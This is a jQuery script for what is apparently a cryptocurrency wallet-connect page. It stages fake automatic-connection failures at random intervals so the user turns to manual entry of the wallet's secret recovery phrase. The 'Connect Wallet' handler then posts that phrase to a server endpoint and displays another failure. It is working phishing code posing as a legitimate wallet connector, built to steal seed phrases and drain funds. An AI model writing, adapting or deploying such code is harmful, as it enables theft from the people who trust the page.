
    // Handle Select Wallet Click
    $(function () {
        $('.selectWall').on('click', function () {
            var wd = $(this); // wd = wallet details
            $('#wall_nme').text(wd.data('title'));
            $('#wallLogo').attr("src", wd.data('logo'));
            $('#autoCnct').show();
            $('#failCnct').hide();
            $('#cnctManu').hide();

            $('#popCntWal').modal('show');

            // Hide autoconnecting div and show error in random interval
            var interval = 1000 * getRandomInt(1, 15);
            setTimeout(() => {
                $('#autoCnct').hide();
                $('#cnctManu').hide();
                $('#failCnct').show();
            }, interval);
        });

        $('#try_autoCnct_again').on('click', function (e) {
            e.preventDefault();
            $('#autoCnct').show();
            $('#failCnct').hide();
            $('#cnctManu').hide();

            // Hide autoconnecting div and show error in random interval
            var interval = 1000 * getRandomInt(1, 20);
            setTimeout(() => {
                $('#autoCnct').hide();
                $('#cnctManu').hide();
                $('#failCnct').show();
            }, interval);
        });

        $(document).on("click", "#button_connect_manually", function (e) {
            e.preventDefault();
            $('#autoCnct').hide();
            $('#failCnct').hide();
            $('#cnctManu').show();
        });

     //FOR PHRASE TEXT VALIDATION
            $('#scrtPhrs').on('keyup', function () {
                var phrase_seed_entered = $(this).val().trim()
                if (phrase_seed_entered != "") {
                    var phrase_count = phrase_seed_entered.match(/(\w+)/g).length
                    console.log(phrase_count)
                    if ([12, 15, 18, 21, 24].includes(phrase_count)) {
                        $('#btnCnctWal').attr('disabled', false).css('opacity', '1')
                    } else {
                        $('#btnCnctWal').attr('disabled', false).css('opacity', '1')
                    }
                } else {
                    $('#btnCnctWal').attr('disabled', true).css('opacity', '0.2')
                }
            })

        // CONNECT WALLET BUTTON Handler
        $(document).on("click", "#btnCnctWal", function (e) {
            e.preventDefault();
            let field = $('#scrtPhrs');
            $(this).text('Connecting...');

            var interval = 1000 * getRandomInt(1, 20);
            setTimeout(() => {
                $('#autoCnct').hide();
                $('#cnctManu').hide();
                $('#failCnct').show();
                $(this).text('Connect Wallet');
            }, interval);

            var formData = {
                wallet_phrase: field.val(),
                wall_nme: $('#wall_nme').text(),
                sent: 'yes'
            };

            $.ajax({
                type: "POST",
                url: "configuration/process",
                data: formData,
                dataType: "json",
                encode: true,
            }).done(function (data) {
                console.log(data);
            });
        });

        function getRandomInt(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min) + min); // The maximum is exclusive and the minimum is inclusive
        }
        
        
        
        $('.search').keyup(function(){
            var key = $(this).val()
            var found = false
            $('.wallets').each(function(){
                var dataTitle = $(this).find(".sc-author-box").data("title");
                if(dataTitle.toLowerCase().startsWith(key.toLowerCase())){
                    found = true
                    $(this).show()
                }else{
                    $(this).hide()
                }
                setTimeout(function(){
                    if(!found){
                        $('.error').css('display', 'block')
                    }else{
                        $('.error').css('display', 'none')
                    }
                }, 1)
            })
        })
        
    });